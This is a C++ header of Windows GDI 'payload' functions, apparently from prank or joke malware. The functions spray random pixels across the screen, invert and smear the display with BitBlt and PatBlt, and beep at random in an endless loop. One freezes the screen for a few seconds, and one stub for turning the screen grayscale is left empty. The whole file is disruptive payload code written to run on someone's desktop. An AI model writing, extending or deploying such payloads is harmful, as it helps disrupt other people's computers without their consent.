#pragma once
#include "include.hpp"

#define fori(x) for (int i=0;i<(x);i++)
#define forj(x) for (int j=0;j<(x);j++)
#define randomRGB random(255)
#define pp (LPVOID __p)
#define p ((PAYLOADPARAMS *)__p)

DWORD WINAPI p1 pp {
	fori(p->x) {
		forj(p->y) {
			SetPixel(p->hdc, i, j, RGB(randomRGB, randomRGB, randomRGB));
		}
	}
	ExitThread(0);
}

DWORD WINAPI p2 pp {
	fori(100) {
		int x_begin = random(p->x), y_begin = random(p->y);
		BitBlt(p->hdc, x_begin, y_begin, x_begin + random(p->x - x_begin), y_begin + random(p->y - y_begin), p->hdc, 0, 0, NOTSRCCOPY);
		Sleep(100);
	}
	ExitThread(0);
}

DWORD WINAPI p3 pp {
	while (true) {
		Beep(200 + random(512), random(2048));
		Sleep(random(4096));
	}
	ExitThread(0);
}

DWORD WINAPI p4 pp {
	HBRUSH brush = CreateSolidBrush(RGB(255, 0, 0));
	HDC hdc = GetDC(NULL);
	SelectObject(hdc, brush);
	fori(100) {
		PatBlt(hdc, random(p->x), random(p->y), random(p->x), random(p->y), PATINVERT);
		Sleep(random(1000));
	}
	ReleaseDC(NULL, hdc);
	DeleteObject(brush);
	ExitThread(0);
}

DWORD WINAPI p5 pp {
	fori(1000) {
		BitBlt(p->hdc, random(p->x), random(p->y), p->x, p->y, p->hdc, 0, 0, SRCCOPY);
		Sleep(512);
	}
	ExitThread(0);
}

DWORD WINAPI p6 pp {
	fori(1000) {
		BitBlt(p->hdc, 0, 0, p->x, p->y, p->hdc, 0, 0, NOTSRCCOPY);
		Sleep(512);
	}
	ExitThread(0);
}

// shoutout @clxyify on github for p7 and p8 ideas

DWORD WINAPI p7 pp {
	// turn screen grayscale
}

DWORD WINAPI p8 pp {
	// freeze screen for x seconds
	HBITMAP screen = CreateCompatibleBitmap(p->hdc, p->x, p->y);
	HBRUSH brush = CreatePatternBrush(screen);
	HDC hdc = GetDC(NULL);
	SelectObject(hdc, brush);
	ULONGLONG start = GetTickCount64();
	while (GetTickCount64() - start < /*random(4096)*/4000) {
		PatBlt(p->hdc, 0, 0, p->x, p->y, PATCOPY);
	}
	ReleaseDC(NULL, hdc);
	DeleteObject(brush);
	DeleteObject(screen);
	ExitThread(0);
}

